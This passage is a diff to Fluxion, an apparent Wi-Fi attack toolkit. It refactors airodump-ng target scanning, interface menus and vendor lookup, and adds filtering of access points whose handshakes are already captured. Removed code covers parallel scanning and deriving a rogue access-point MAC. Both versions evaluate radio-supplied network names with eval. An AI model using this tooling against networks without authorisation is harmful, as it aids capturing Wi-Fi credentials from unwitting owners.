+        interfacesAvailable+=("$candidateInterface")
 
         interfacesAvailableColor+=("$CGrn")
         interfacesAvailableState+=("[*]")
@@ -1088,6 +1342,8 @@ fluxion_get_interface() {
       if [ $skipOption ]; then
         interfacesAvailable+=("$FLUXIONGeneralSkipOption")
         interfacesAvailableColor+=("$CClr")
+        interfacesAvailableBands+=("")
+        interfacesAvailableBus+=("")
       fi
 
       interfacesAvailable+=(
@@ -1100,13 +1356,35 @@ fluxion_get_interface() {
         "$CClr"
       )
 
+      interfacesAvailableBands+=("" "")
+      interfacesAvailableBus+=("" "")
+
+      local __ifaceMaxLen=8
+      local __ifaceEntry
+      for __ifaceEntry in "${interfacesAvailable[@]}"; do
+        [ ${#__ifaceEntry} -gt $__ifaceMaxLen ] && __ifaceMaxLen=${#__ifaceEntry}
+      done
+
+      local __bandMaxLen=0
+      local __bandEntry
+      for __bandEntry in "${interfacesAvailableBands[@]}"; do
+        [ ${#__bandEntry} -gt $__bandMaxLen ] && __bandMaxLen=${#__bandEntry}
+      done
+
+      local __busMaxLen=0
+      local __busEntry
+      for __busEntry in "${interfacesAvailableBus[@]}"; do
+        [ ${#__busEntry} -gt $__busMaxLen ] && __busMaxLen=${#__busEntry}
+      done
+
       format_apply_autosize \
-        "$CRed[$CSYel%1d$CClr$CRed]%b %-8b %3s$CClr %-*.*s\n"
+        "$CRed[$CSYel%1d$CClr$CRed]%b %-${__ifaceMaxLen}b %3s %-${__bandMaxLen}s %-${__busMaxLen}s$CClr %-*.*s\n"
 
       io_query_format_fields \
         "$FLUXIONVLine $interfaceQuery" "$FormatApplyAutosize" \
         interfacesAvailableColor[@] interfacesAvailable[@] \
-        interfacesAvailableState[@] interfacesAvailableInfo[@]
+        interfacesAvailableState[@] interfacesAvailableBands[@] \
+        interfacesAvailableBus[@] interfacesAvailableInfo[@]
 
       echo
 
@@ -1121,152 +1399,10 @@ fluxion_get_interface() {
         *)
           FluxionInterfaceSelected="${IOQueryFormatFields[1]}"
           FluxionInterfaceSelectedState="${IOQueryFormatFields[2]}"
-          FluxionInterfaceSelectedInfo="${IOQueryFormatFields[3]}"
+          FluxionInterfaceSelectedInfo="${IOQueryFormatFields[5]}"
           break;;
       esac
     fi
-  done
-}
-
-# Parameters: <interfaces:lambda> [<query>]
-# Multi-select version - allows selecting multiple interfaces
-# ------------------------------------------------------------ #
-# Return -1: Go back
-# Return  1: Missing interfaces lambda identifier (not passed).
-fluxion_get_interfaces_multi() {
-  if ! type -t "$1" &> /dev/null; then return 1; fi
-
-  if [ "$2" ]; then
-    local -r interfaceQuery="$2"
-  else
-    local -r interfaceQuery="$FLUXIONInterfaceQuery (multi-select)"
-  fi
-
-  FluxionInterfacesSelected=()
-
-  while true; do
-    fluxion_header
-
-    # Show currently selected interfaces
-    if [ ${#FluxionInterfacesSelected[@]} -gt 0 ]; then
-      echo -e "$FLUXIONVLine ${CGrn}Selected interfaces: ${FluxionInterfacesSelected[@]}$CClr"
-      echo
-    fi
-
-    local candidateInterfaces
-    readarray -t candidateInterfaces < <($1)
-    local interfacesAvailable=()
-    local interfacesAvailableInfo=()
-    local interfacesAvailableColor=()
-    local interfacesAvailableState=()
-
-    # Gather information from all available interfaces.
-    local candidateInterface
-    for candidateInterface in "${candidateInterfaces[@]}"; do
-      if [ ! "$candidateInterface" ]; then
-        continue
-      fi
-
-      interface_chipset "$candidateInterface"
-      interfacesAvailableInfo+=("$InterfaceChipset")
-
-      # If it has already been allocated, we can use it at will.
-      local candidateInterfaceAlt=${FluxionInterfaces["$candidateInterface"]}
-      if [ "$candidateInterfaceAlt" ]; then
-        candidateInterface="$candidateInterfaceAlt"
-      fi
-
-      interfacesAvailable+=("$candidateInterface")
-
-      # Check if already selected
-      local already_selected=0
-      for selected in "${FluxionInterfacesSelected[@]}"; do
-        if [ "$selected" = "$candidateInterface" ]; then
-          already_selected=1
-          break
-        fi
-      done
-
-      if [ $already_selected -eq 1 ]; then
-        interfacesAvailableColor+=("$CGrn")
-        interfacesAvailableState+=("[✓]")
-      else
-        interface_state "$candidateInterface"
-        if [ "$InterfaceState" = "up" ]; then
-          interfacesAvailableColor+=("$CPrp")
-          interfacesAvailableState+=("[-]")
-        else
-          interfacesAvailableColor+=("$CClr")
-          interfacesAvailableState+=("[ ]")
-        fi
-      fi
-    done
-
-    local doneOption="Done (${#FluxionInterfacesSelected[@]} selected)"
-    interfacesAvailable+=(
-      "$doneOption"
-      "$FLUXIONGeneralBackOption"
-    )
-
-    interfacesAvailableColor+=(
-      "$CClr"
-      "$CClr"
-    )
-
-    interfacesAvailableState+=(
-      ""
-      ""
-    )
-
-    interfacesAvailableInfo+=(
-      ""
-      ""
-    )
-
-    format_apply_autosize \
-      "$CRed[$CSYel%1d$CClr$CRed]%b %-8b %3s$CClr %-*.*s\n"
-
-    io_query_format_fields \
-      "$FLUXIONVLine $interfaceQuery" "$FormatApplyAutosize" \
-      interfacesAvailableColor[@] interfacesAvailable[@] \
-      interfacesAvailableState[@] interfacesAvailableInfo[@]
-
-    echo
-
-    local selected="${IOQueryFormatFields[1]}"
-
-    case "$selected" in
-      "$doneOption")
-        if [ ${#FluxionInterfacesSelected[@]} -eq 0 ]; then
-          echo -e "$FLUXIONVLine ${CRed}Please select at least one interface$CClr"
-          sleep 2
-          continue
-        fi
-        return 0;;
-      "$FLUXIONGeneralBackOption")
-        return -1;;
-      *)
-        # Toggle selection
-        local found=0
-        local new_selection=()
-        for iface in "${FluxionInterfacesSelected[@]}"; do
-          if [ "$iface" = "$selected" ]; then
-            found=1
-            # Skip this one (deselect)
-          else
-            new_selection+=("$iface")
-          fi
-        done
-
-        if [ $found -eq 0 ]; then
-          # Add to selection
-          FluxionInterfacesSelected+=("$selected")
-        else
-          # Update with removed item
-          FluxionInterfacesSelected=("${new_selection[@]}")
-        fi
-        ;;
-    esac
   done
 }
 
@@ -1288,18 +1424,28 @@ fluxion_target_get_candidates() {
   # Assure all previous scan results have been cleared.
   sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
 
-  #if [ "$FLUXIONAuto" ]; then
-  #  sleep 30 && killall xterm &
-  #fi
-
   # Begin scanner and output all results to "dump-01.csv."
-if ! xterm -title "$FLUXIONScannerHeader" $TOPLEFTBIG \
-    -bg "#000000" -fg "#FFFFFF" -e \
-    "airodump-ng -Mat WPA "${2:+"--channel $2"}" "${3:+"--band $3"}" -w \"$FLUXIONWorkspacePath/dump\" $1" 2> $FLUXIONOutputDevice; then
-    echo -e "$FLUXIONVLine$CRed $FLUXIONGeneralXTermFailureError"
-    sleep 5
-    return 2
-fi
+  local channelParam="${2:+--channel $2}"
+  local bandParam="${3:+--band $3}"
+  local scanCmd="airodump-ng -Mat WPA $channelParam $bandParam -w \"$FLUXIONWorkspacePath/dump\" $1"
+
+  if [ "$FLUXIONAuto" ]; then
+    # In auto mode, run scanner for --scan-time seconds then kill it.
+    local scannerPID
+    fluxion_window_open scannerPID "$FLUXIONScannerHeader" \
+      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd"
+    sleep "$FLUXIONScanTime"
+    fluxion_window_close scannerPID
+    # Give airodump-ng a moment to flush output files.
+    sleep 1
+  else
+    if ! fluxion_window_open "" "$FLUXIONScannerHeader" \
+      "$TOPLEFTBIG" "#000000" "#FFFFFF" "$scanCmd" 2> $FLUXIONOutputDevice; then
+      echo -e "$FLUXIONVLine$CRed $FLUXIONGeneralXTermFailureError"
+      sleep 5
+      return 2
+    fi
+  fi
 
   # Sanity check the capture files generated by the scanner.
   # If the file doesn't exist, or if it's empty, abort immediately.
@@ -1323,7 +1469,7 @@ fi
   # )
   local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
   readarray FluxionTargetCandidates < <(
-    awk -F, "NF==15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
+    awk -F, "NF>=15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
     "$FLUXIONWorkspacePath/dump-01.csv"
   )
   readarray FluxionTargetCandidatesClients < <(
@@ -1331,279 +1477,18 @@ fi
     "$FLUXIONWorkspacePath/dump-01.csv"
   )
 
-  # Cleanup the workspace to prevent potential bugs/conflicts.
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
+  # Note: Don't cleanup dump* files yet - we need dump-01.kismet.netxml
+  # for vendor lookup in fluxion_get_target()
 
   if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
+    # Cleanup on failure
+    sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
     echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
     sleep 3
     return 4
   fi
 }
 
-# Parameters: channel(s) band(s) interface1 interface2 ... interfaceN
-# Multi-interface parallel scanning with result merging
-# ------------------------------------------------------------ #
-# Return 1: No valid interfaces provided.
-# Return 2: Xterm failed to start airodump-ng.
-# Return 3: Invalid capture files were generated.
-# Return 4: No candidates were detected.
-fluxion_target_get_candidates_multi() {
-  local channels="$1"
-  local bands="$2"
-  shift 2
-  local -a interfaces=("$@")
-
-  if [ ${#interfaces[@]} -eq 0 ]; then return 1; fi
-
-  echo -e "$FLUXIONVLine ${CGrn}Starting parallel scan on ${#interfaces[@]} interface(s)$CClr"
-  echo -e "$FLUXIONVLine $FLUXIONStartingScannerTip"
-
-  # Assure all previous scan results have been cleared.
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/scan_*"
-
-  local -a scanner_pids=()
-  local interface_index=0
-
-  # Launch airodump-ng on each interface in separate xterm windows
-  for interface in "${interfaces[@]}"; do
-    if ! interface_is_wireless "$interface"; then
-      echo -e "$FLUXIONVLine ${CYel}Skipping non-wireless interface: $interface$CClr"
-      continue
-    fi
-
-    local output_prefix="$FLUXIONWorkspacePath/scan_$interface_index"
-
-    xterm -title "$FLUXIONScannerHeader [$interface]" $TOPLEFTBIG \
-      -geometry 100x15+$((interface_index * 50))+$((interface_index * 50)) \
-      -bg "#000000" -fg "#00FF00" -e \
-      "airodump-ng -Mat WPA ${channels:+--channel $channels} ${bands:+--band $bands} -w \"$output_prefix\" $interface; echo 'Scan complete on $interface - Press ENTER'; read" 2> $FLUXIONOutputDevice &
-
-    scanner_pids+=($!)
-    ((interface_index++))
-  done
-
-  if [ ${#scanner_pids[@]} -eq 0 ]; then
-    echo -e "$FLUXIONVLine${CRed} No valid wireless interfaces found$CClr"
-    return 2
-  fi
-
-  # Wait for all scanner processes to complete
-  echo -e "$FLUXIONVLine ${CCyn}Waiting for ${#scanner_pids[@]} scanner(s) to complete...$CClr"
-  for pid in "${scanner_pids[@]}"; do
-    wait $pid 2>/dev/null
-  done
-
-  # Merge all CSV files
-  echo -e "$FLUXIONVLine $FLUXIONPreparingScannerResultsNotice"
-
-  local merged_aps="$FLUXIONWorkspacePath/merged_aps.tmp"
-  local merged_clients="$FLUXIONWorkspacePath/merged_clients.tmp"
-
-  > "$merged_aps"
-  > "$merged_clients"
-
-  local found_data=0
-
-  # Process each capture file
-  for ((i=0; i<interface_index; i++)); do
-    local csv_file="$FLUXIONWorkspacePath/scan_$i-01.csv"
-
-    if [ -f "$csv_file" ] && [ -s "$csv_file" ]; then
-      found_data=1
-
-      local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
-
-      # Extract APs (15 fields)
-      awk -F, "NF==15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" "$csv_file" >> "$merged_aps"
-
-      # Extract clients (7 fields)
-      awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" "$csv_file" >> "$merged_clients"
-    fi
-  done
-
-  if [ $found_data -eq 0 ]; then
-    sandbox_remove_workfile "$FLUXIONWorkspacePath/scan_*"
-    sandbox_remove_workfile "$FLUXIONWorkspacePath/merged_*"
-    return 3
-  fi
-
-  # Remove duplicates based on MAC address (field 1) and keep strongest signal
-  # For APs: sort by MAC and power (field 9), keep best
-  readarray FluxionTargetCandidates < <(
-    sort -t, -k1,1 -k9,9nr "$merged_aps" | \
-    awk -F, '!seen[$1]++ {print $0}'
-  )
-
-  # For clients: just unique MACs
-  readarray FluxionTargetCandidatesClients < <(
-    sort -t, -k1,1 -u "$merged_clients"
-  )
-
-  # Cleanup temporary files
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/scan_*"
-  sandbox_remove_workfile "$FLUXIONWorkspacePath/merged_*"
-
-  if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
-    echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
-    sleep 3
-    return 4
-  fi
-
-  echo -e "$FLUXIONVLine ${CGrn}Found ${#FluxionTargetCandidates[@]} unique access point(s)$CClr"
-  sleep 2
-}
-
-
-fluxion_get_target_multi() {
-  # Multi-interface version - receives multiple interfaces
-  local -a interfaces=("$@")
-
-  if [ ${#interfaces[@]} -eq 0 ]; then return 1; fi
-
-  # Validate all interfaces are wireless
-  for iface in "${interfaces[@]}"; do
-    if ! interface_is_wireless "$iface"; then
-      echo -e "$FLUXIONVLine ${CRed}Non-wireless interface detected: $iface$CClr"
-      return 1
-    fi
-  done
-
-  local choices=( \
-    "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
-    "$FLUXIONScannerChannelOptionAll (5GHz)" \
-    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
-    "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption"
-  )
-
-  io_query_choice "$FLUXIONScannerChannelQuery" choices[@]
-
-  echo
-
-  case "$IOQueryChoice" in
-    "$FLUXIONScannerChannelOptionAll (2.4GHz)")
-      fluxion_target_get_candidates_multi "" "bg" "${interfaces[@]}";;
-
-    "$FLUXIONScannerChannelOptionAll (5GHz)")
-      fluxion_target_get_candidates_multi "" "a" "${interfaces[@]}";;
-
-    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
-      fluxion_target_get_candidates_multi "" "abg" "${interfaces[@]}";;
-
-    "$FLUXIONScannerChannelOptionSpecific")
-      fluxion_header
-
-      echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
-      echo
-      echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
-      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
-      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
-      echo
-      echo -ne "$FLUXIONPrompt"
-
-      local channels
-      read channels
-
-      echo
-
-      fluxion_target_get_candidates_multi "$channels" "" "${interfaces[@]}";;
-
-    "$FLUXIONGeneralBackOption")
-      return -1;;
-  esac
-
-  # Abort if errors occured while searching for candidates.
-  if [ $? -ne 0 ]; then return 2; fi
-
-  local candidatesMAC=()
-  local candidatesClientsCount=()
-  local candidatesChannel=()
-  local candidatesSecurity=()
-  local candidatesSignal=()
-  local candidatesPower=()
-  local candidatesESSID=()
-  local candidatesColor=()
-
-  # Gather information from all the candidates detected.
-  for candidateAPInfo in "${FluxionTargetCandidates[@]}"; do
-    candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")
-
-    local i=${#candidatesMAC[@]}
-
-    candidatesMAC[i]=$(echo "$candidateAPInfo" | cut -d , -f 1)
-    candidatesClientsCount[i]=$(
-      echo "${FluxionTargetCandidatesClients[@]}" |
-      grep -c "${candidatesMAC[i]}"
-    )
-    candidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
-    candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
-    candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
-    candidatesColor[i]=$(
-      [ ${candidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr
-    )
-
-    local sanitizedESSID=$(
-      echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
-    )
-    candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
-
-    local power=${candidatesPower[i]}
-    if [ $power -eq -1 ]; then
-      candidatesQuality[i]="??"
-    elif [ $power -le $FLUXIONNoiseFloor ]; then
-      candidatesQuality[i]=0
-    elif [ $power -gt $FLUXIONNoiseCeiling ]; then
-      candidatesQuality[i]=100
-    else
-      candidatesQuality[i]=$(( \
-        (${candidatesPower[i]} * 10 - $FLUXIONNoiseFloor * 10) / \
-        (($FLUXIONNoiseCeiling - $FLUXIONNoiseFloor) / 10) \
-      ))
-    fi
-  done
-
-  format_center_literals "WIFI LIST"
-  local -r headerTitle="$FormatCenterLiterals\n\n"
-
-  format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %-*.*s %4s %3s %3s %2s %-8.8s %18s\n"
-  local -r headerFields=$(
-    printf "$FormatApplyAutosize" \
-      "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID"
-  )
-
-  format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %-*.*s %3s%% %3s %3d %2s %-8.8s %18s\n"
-  io_query_format_fields "$headerTitle$headerFields" \
-   "$FormatApplyAutosize" \
-    candidatesColor[@] \
-    candidatesESSID[@] \
-    candidatesQuality[@] \
-    candidatesPower[@] \
-    candidatesClientsCount[@] \
-    candidatesChannel[@] \
-    candidatesSecurity[@] \
-    candidatesMAC[@]
-
-  echo
-
-  FluxionTargetMAC=${IOQueryFormatFields[7]}
-  FluxionTargetSSID=${IOQueryFormatFields[1]}
-  FluxionTargetChannel=${IOQueryFormatFields[5]}
-
-  FluxionTargetEncryption=${IOQueryFormatFields[6]}
-
-  FluxionTargetMakerID=${FluxionTargetMAC:0:8}
-  FluxionTargetMaker=$(
-    macchanger -l |
-    grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
-    cut -d ' ' -f 5-
-  )
-
-  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)
-
-  local -r rogueMACHex=$(printf %02X $((0x${FluxionTargetMAC:13:1} + 1)))
-  FluxionTargetRogueMAC="${FluxionTargetMAC::13}${rogueMACHex:1:1}${FluxionTargetMAC:14:4}"
-}
 
 fluxion_get_target() {
   # Assure a valid wireless interface for scanning was given.
@@ -1611,114 +1496,90 @@ fluxion_get_target() {
 
   local -r interface=$1
 
-  # Detect all available wireless interfaces for multi-device scanning
-  interface_list_wireless
-  local available_wireless=()
-  for iface in "${InterfaceListWireless[@]}"; do
-    # Only include monitor mode or allocated interfaces
-    if [[ "$iface" == *"mon"* ]] || [ "${FluxionInterfaces[$iface]}" ]; then
-      available_wireless+=("$iface")
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: use -c channel if provided, otherwise scan all 2.4GHz.
+    if [ "$FluxionTargetChannel" ]; then
+      local band=""
+      local firstChannel=$(echo "$FluxionTargetChannel" | grep -oE '[0-9]+' | head -1)
+      if [ -n "$firstChannel" ] && [ "$firstChannel" -le 14 ]; then
+        band="bg"
+      else
+        band="a"
+      fi
+      fluxion_target_get_candidates $interface "$FluxionTargetChannel" "$band"
+    else
+      fluxion_target_get_candidates $interface "" "bg"
     fi
-  done
+  else
+    interface_bands "$interface" 2>/dev/null
+    local __ifBands="${InterfaceBands:-unknown}"
+    local choices=()
+    if [[ "$__ifBands" == *"2.4GHz"* ]]; then
+      choices+=("$FLUXIONScannerChannelOptionAll (2.4GHz)")
+    fi
+    if [[ "$__ifBands" == *"5GHz"* ]]; then
+      choices+=("$FLUXIONScannerChannelOptionAll (5GHz)")
+    fi
+    if [[ "$__ifBands" == *"2.4GHz"* ]] && [[ "$__ifBands" == *"5GHz"* ]]; then
+      choices+=("$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
+    fi
+    if [ ${#choices[@]} -eq 0 ]; then
+      choices+=( \
+        "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
+        "$FLUXIONScannerChannelOptionAll (5GHz)" \
+        "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
+      )
+    fi
+    choices+=("$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption")
 
-  local use_multi_scan=0
-  local scan_interfaces=("$interface")
+    io_query_choice "$FLUXIONScannerChannelQuery" choices[@]
 
-  # If multiple wireless interfaces available, offer multi-device option
-  if [ ${#available_wireless[@]} -gt 1 ]; then
-    fluxion_header
-    echo -e "$FLUXIONVLine ${CCyn}Detected ${#available_wireless[@]} wireless interface(s)$CClr"
-    echo
-    for iface in "${available_wireless[@]}"; do
-      echo -e "     ${CGrn}→$CClr $iface"
-    done
-    echo
-
-    local scan_choices=( \
-      "Single interface scan ($interface)" \
-      "Multi-interface parallel scan (${#available_wireless[@]} devices)" \
-      "$FLUXIONGeneralBackOption"
-    )
-
-    io_query_choice "Select scanning mode" scan_choices[@]
     echo
 
     case "$IOQueryChoice" in
-      "Multi-interface parallel scan (${#available_wireless[@]} devices)")
-        use_multi_scan=1
-        scan_interfaces=("${available_wireless[@]}")
-        ;;
+      "$FLUXIONScannerChannelOptionAll (2.4GHz)")
+        fluxion_target_get_candidates $interface "" "bg";;
+
+      "$FLUXIONScannerChannelOptionAll (5GHz)")
+        fluxion_target_get_candidates $interface "" "a";;
+
+      "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
+        fluxion_target_get_candidates $interface "" "abg";;
+
+      "$FLUXIONScannerChannelOptionSpecific")
+        fluxion_header
+
+        echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
+        echo
+        echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
+        echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
+        echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
+        echo
+        echo -ne "$FLUXIONPrompt"
+
+        local channels
+        read channels
+
+        echo
+
+        # Determine band based on channel number
+        # Channels 1-14 are 2.4GHz (band bg), 36+ are 5GHz (band a)
+        local band=""
+        local firstChannel=$(echo "$channels" | grep -oE '[0-9]+' | head -1)
+        if [ -n "$firstChannel" ]; then
+          if [ "$firstChannel" -le 14 ]; then
+            band="bg"
+          else
+            band="a"
+          fi
+        fi
+
+        fluxion_target_get_candidates $interface $channels "$band";;
+
       "$FLUXIONGeneralBackOption")
         return -1;;
-      *)
-        use_multi_scan=0
-        scan_interfaces=("$interface")
-        ;;
     esac
   fi
-
-  local choices=( \
-    "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
-    "$FLUXIONScannerChannelOptionAll (5GHz)" \
-    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
-    "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption"
-  )
-
-  io_query_choice "$FLUXIONScannerChannelQuery" choices[@]
-
-  echo
-
-  case "$IOQueryChoice" in
-    "$FLUXIONScannerChannelOptionAll (2.4GHz)")
-      if [ $use_multi_scan -eq 1 ]; then
-        fluxion_target_get_candidates_multi "" "bg" "${scan_interfaces[@]}"
-      else
-        fluxion_target_get_candidates $interface "" "bg"
-      fi
-      ;;
-
-    "$FLUXIONScannerChannelOptionAll (5GHz)")
-      if [ $use_multi_scan -eq 1 ]; then
-        fluxion_target_get_candidates_multi "" "a" "${scan_interfaces[@]}"
-      else
-        fluxion_target_get_candidates $interface "" "a"
-      fi
-      ;;
-
-    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
-      if [ $use_multi_scan -eq 1 ]; then
-        fluxion_target_get_candidates_multi "" "abg" "${scan_interfaces[@]}"
-      else
-        fluxion_target_get_candidates $interface "" "abg"
-      fi
-      ;;
-
-    "$FLUXIONScannerChannelOptionSpecific")
-      fluxion_header
-
-      echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
-      echo
-      echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
-      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
-      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
-      echo
-      echo -ne "$FLUXIONPrompt"
-
-      local channels
-      read channels
-
-      echo
-
-      if [ $use_multi_scan -eq 1 ]; then
-        fluxion_target_get_candidates_multi "$channels" "" "${scan_interfaces[@]}"
-      else
-        fluxion_target_get_candidates $interface $channels
-      fi
-      ;;
-
-    "$FLUXIONGeneralBackOption")
-      return -1;;
-  esac
 
   # Abort if errors occured while searching for candidates.
   if [ $? -ne 0 ]; then return 2; fi
@@ -1731,22 +1592,101 @@ fluxion_get_target() {
   local candidatesPower=()
   local candidatesESSID=()
   local candidatesColor=()
+  local candidatesVendor=()
+  local candidatesHandshake=()
+
+  # Build list of BSSIDs that already have valid handshakes
+  local -A existingHandshakes
+  local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
+  if [ -d "$handshakeDir" ]; then
+    local handshakeFile
+    for handshakeFile in "$handshakeDir"/*.cap; do
+      if [ -f "$handshakeFile" ] && [ -s "$handshakeFile" ]; then
+        # Extract BSSID from filename (format: *<BSSID>.cap)
+        local filename=$(basename "$handshakeFile")
+        # Match MAC address pattern at end before .cap
+        if [[ "$filename" =~ ([A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2}:[A-F0-9]{2})\.cap$ ]]; then
+          local bssid="${BASH_REMATCH[1]}"
+          # Store both uppercase and lowercase versions for matching
+          existingHandshakes["${bssid^^}"]=1
+          existingHandshakes["${bssid,,}"]=1
+        fi
+      fi
+    done
+  fi
+
+  # Build vendor lookup table from kismet netxml file if it exists
+  local -A vendorLookup
+  if [ -f "$FLUXIONWorkspacePath/dump-01.kismet.netxml" ]; then
+    # Extract MAC and manuf pairs from netxml file
+    # Each wireless-network block has <BSSID> followed by <manuf>
+    while IFS= read -r line; do
+      if [[ "$line" =~ \<BSSID\>([A-F0-9:]+)\</BSSID\> ]]; then
+        local currentMAC="${BASH_REMATCH[1]}"
+      elif [[ "$line" =~ \<manuf\>(.+)\</manuf\> ]] && [ -n "$currentMAC" ]; then
+        local manufName="${BASH_REMATCH[1]}"
+        # Decode HTML entities (e.g., &amp; -> &)
+        manufName=$(echo "$manufName" | sed 's/&amp;/\&/g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/"/g')
+        vendorLookup["$currentMAC"]="$manufName"
+        currentMAC=""
+      fi
+    done < "$FLUXIONWorkspacePath/dump-01.kismet.netxml"
+  fi
 
   # Gather information from all the candidates detected.
   # TODO: Clean up this for loop using a cleaner algorithm.
   # Maybe try using array appending & [-1] for last elements.
+  local filteredCount=0
   for candidateAPInfo in "${FluxionTargetCandidates[@]}"; do
     # Strip candidate info from any extraneous spaces after commas.
     candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")
 
+    local candidateMAC=$(echo "$candidateAPInfo" | cut -d , -f 1)
+    
+    # For Handshake Snooper: skip networks with existing handshakes
+    # For other attacks: mark them but don't skip
+    if [ -n "${existingHandshakes[$candidateMAC]}" ]; then
+      if [ "$FluxionAttack" = "Handshake Snooper" ]; then
+        ((filteredCount++))
+        continue
+      fi
+    fi
+
     local i=${#candidatesMAC[@]}
 
-    candidatesMAC[i]=$(echo "$candidateAPInfo" | cut -d , -f 1)
+    candidatesMAC[i]="$candidateMAC"
+    
+    # Look up vendor from kismet netxml file first, fallback to macchanger
+    if [ -n "${vendorLookup[${candidatesMAC[i]}]}" ]; then
+      local vendor="${vendorLookup[${candidatesMAC[i]}]}"
+      # Don't show "Unknown" vendors - leave empty instead
+      if [ "$vendor" != "Unknown" ]; then
+        candidatesVendor[i]="$vendor"
+      else
+        candidatesVendor[i]=""
+      fi
+    else
+      # Fallback to macchanger OUI lookup
+      local makerID=${candidatesMAC[i]:0:8}
+      candidatesVendor[i]=$(
+        macchanger -l 2>/dev/null |
+        grep -i "${makerID,,}" |
+        cut -d ' ' -f 5- |
+        head -n 1
+      )
+      # Leave empty if no vendor found (don't show "Unknown")
+    fi
     candidatesClientsCount[i]=$(
       echo "${FluxionTargetCandidatesClients[@]}" |
       grep -c "${candidatesMAC[i]}"
     )
-    candidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
+    local __ch=$(echo "$candidateAPInfo" | cut -d , -f 4 | tr -d ' ')
+    if [ "$__ch" -ge 52 -a "$__ch" -le 64 ] 2>/dev/null || \
+       [ "$__ch" -ge 100 -a "$__ch" -le 144 ] 2>/dev/null; then
+      candidatesChannel[i]="${__ch}!"
+    else
+      candidatesChannel[i]="$__ch"
+    fi
     candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
     candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
     candidatesColor[i]=$(
@@ -1759,6 +1699,13 @@ fluxion_get_target() {
       echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
     )
     candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
+    
+    # Mark networks with existing handshakes with asterisk
+    if [ "$FluxionAttack" != "Handshake Snooper" ] && [ -n "${existingHandshakes[$candidateMAC]}" ]; then
+      candidatesHandshake[i]="*"
+    else
+      candidatesHandshake[i]=" "
+    fi
 
     local power=${candidatesPower[i]}
     if [ $power -eq -1 ]; then
@@ -1778,41 +1725,121 @@ fluxion_get_target() {
     fi
   done
 
-  format_center_literals "WIFI LIST"
-  local -r headerTitle="$FormatCenterLiterals\n\n"
+  # Check if all networks were filtered out
+  if [ ${#candidatesMAC[@]} -eq 0 ]; then
+    local emptyMessage=""
+    if [ $filteredCount -gt 0 ]; then
+      emptyMessage="${CYel}All $filteredCount network(s) on this channel have existing handshakes.$CClr\n"
